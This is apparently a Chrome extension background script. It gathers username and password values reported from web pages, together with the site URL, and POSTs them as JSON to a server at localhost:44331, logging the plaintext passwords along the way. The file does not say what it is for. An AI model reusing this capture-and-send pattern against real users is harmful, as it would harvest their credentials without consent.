

console.log("RUNNING")

var value = [];
var user = {
  "username": "",
  "password": "",
  "site": ""
}
var status = false;

storeValue(value)



function handleMessage(request) {
  var input = request.input;
  var context = request.context;
  var url = request.url;
  var alert = request.alert;

  if(input && context){
    try {
      handleUser(input, context, url);
      console.log("MY REQUEST", request);
    } catch (error) {
      console.log("ERROR", error)
    }  
  }
  if(alert){
    handleAlert();
  }
}

chrome.runtime.onMessage.addListener(handleMessage);


function handleUser(input, context, url){
    if(context == "username"){
      user.username = input;
    }
    if(context == "password"){
      user.password = input;
    }
    user.site = url;
    console.log("USER", user);
    return user;
}

function storeValue(value){
  chrome.storage.local.set({value});
}

function getValue(){
  chrome.storage.local.get("value", gotValue);
}


function onError(error) {
  console.log(error)
}

function setItem() {
  console.log("{value}",);
}


function gotValue(item) {
  if(item){
    value =  item.value;
  } else {
    console.log("NO ITEM")
  }
}

function handleAlert(){
  if(user.username && user.password){
    console.log("USER AND PASSWORD DETECTED")
    try {
      let url = "https://localhost:44331/entry/home";

    let xhr = new XMLHttpRequest();
    xhr.open("POST", url);

    xhr.setRequestHeader("Accept", "application/json");
    xhr.setRequestHeader("Content-Type", "application/json");

    xhr.send(JSON.stringify(user));

    // getValue();
    // value.push(user);
    // storeValue(value);
    user = {
      "username": "",
      "password": "",
      "site": ""
    }  
    } catch (error) {
      console.log("ERROR", error)
    }

    
  } else {
    console.log("SCRIPT WAS NOT LISTENING TO ANY USER")
  }
}